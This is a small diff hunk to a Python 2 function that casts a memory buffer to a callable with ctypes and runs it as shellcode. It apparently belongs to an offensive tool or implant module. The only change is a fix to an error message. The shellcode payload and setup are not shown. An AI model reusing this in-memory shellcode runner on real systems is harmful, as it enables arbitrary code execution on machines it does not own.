@@ -18,7 +18,7 @@ def run(**args):
 		shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
 		shellcode_func()
 	except Exception as Ex:
-		print "Could not run the shell. Exception occured: %s " % Ex.value
+		print "Could not run the shell. Exception occured: %s " % Ex
 		return 0, "failed"
 	print "Shellcode executed."
 	return 0, "successfully"
